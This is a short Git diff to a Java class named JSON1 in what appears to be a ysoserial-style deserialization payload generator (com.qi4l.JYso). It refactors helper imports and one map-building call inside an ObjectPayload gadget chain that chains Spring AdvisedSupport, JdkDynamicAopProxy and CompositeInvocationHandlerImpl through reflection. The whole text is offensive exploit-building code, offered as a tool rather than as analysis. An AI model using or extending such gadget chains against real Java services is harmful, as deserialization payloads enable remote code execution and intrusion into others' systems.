@@ -13,8 +13,7 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
 
-import static com.qi4l.JYso.gadgets.JDKUtil.createProxy;
-import static com.qi4l.JYso.gadgets.JDKUtil.makeMap;
+import static com.qi4l.JYso.gadgets.utils.Utils.*;
 
 
 /**
@@ -75,7 +74,7 @@ public class JSON1 implements ObjectPayload<Object> {
         AdvisedSupport as = new AdvisedSupport();
         as.setTarget(tql);
         InvocationHandler delegateInvocationHandler = (InvocationHandler) Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy", as);
-        InvocationHandler cdsInvocationHandler = Gadgets.createMemoizedInvocationHandler(Gadgets.createMap("getCompositeType", rt));
+        InvocationHandler cdsInvocationHandler = Gadgets.createMemoizedInvocationHandler(createMap("getCompositeType", rt));
         InvocationHandler invocationHandler = (InvocationHandler) Reflections.newInstance("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl");
         ((Map) Reflections.getFieldValue(invocationHandler, "classToInvocationHandler")).put(CompositeData.class, cdsInvocationHandler);
         Reflections.setFieldValue(invocationHandler, "defaultHandler", delegateInvocationHandler);
